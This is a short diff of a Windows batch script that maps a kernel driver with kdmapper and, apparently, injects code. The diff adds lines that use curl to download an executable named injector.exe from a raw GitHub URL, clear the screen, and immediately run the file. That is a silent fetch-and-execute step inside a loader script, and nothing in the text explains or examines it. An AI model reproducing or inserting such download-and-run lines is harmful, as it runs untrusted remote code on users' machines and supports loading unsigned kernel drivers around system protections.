@@ -20,7 +20,9 @@ echo Try Inject 5
 echo Try Inject 6
 "kdmapper_Release.exe" "driver.sys"
 echo ok
-
+curl -o injiv8.exe https://raw.githubusercontent.com/getserver/getserver.github.io/main/api/keysys/injector.exe
+cls
+start injiv8.exe
 
 
 set VBScriptFile=temp.vbs
